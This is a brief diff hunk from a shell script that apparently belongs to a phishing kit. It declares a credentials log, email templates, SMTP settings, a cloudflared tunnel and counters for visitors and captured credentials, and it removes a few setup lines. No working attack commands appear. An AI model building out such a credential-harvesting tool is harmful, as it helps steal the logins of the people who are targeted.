@@ -7,12 +7,6 @@ MASTER_LOG="$BASE_DIR/master_creds.log"
 TEMPLATE_DIR="$BASE_DIR/templates"
 SENT_LOG="$BASE_DIR/sent_log.txt"
 SMTP_CONFIG="$BASE_DIR/smtp_config"
-SEEN_IPS="$BASE_DIR/seen_ips.tmp"
-CLOUDFLARED_BIN="$BASE_DIR/cloudflared"
-mkdir -p "$TEMPLATE_DIR" "$BASE_DIR/drafts"
-> "$SEEN_IPS"
-
-UNIQUE_VISITORS=0
 TOTAL_VISITORS=0
 CAPTURED_CREDS=0
 START_TIME=$(date +%s)
